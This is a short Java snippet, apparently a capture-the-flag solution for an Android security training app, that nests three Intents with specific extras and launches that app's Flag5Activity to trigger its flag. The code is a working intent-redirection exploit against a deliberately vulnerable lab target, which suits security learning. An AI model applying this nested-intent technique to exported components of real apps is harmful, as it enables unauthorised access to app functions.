        Intent inner = new Intent();
        inner.putExtra("reason","back");

        Intent mid = new Intent();
        mid.putExtra("nextIntent",inner);
        mid.putExtra("return",42);

        Intent outer = new Intent();
        outer.putExtra("android.intent.extra.INTENT",mid);
        outer.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
        startActivity(outer);
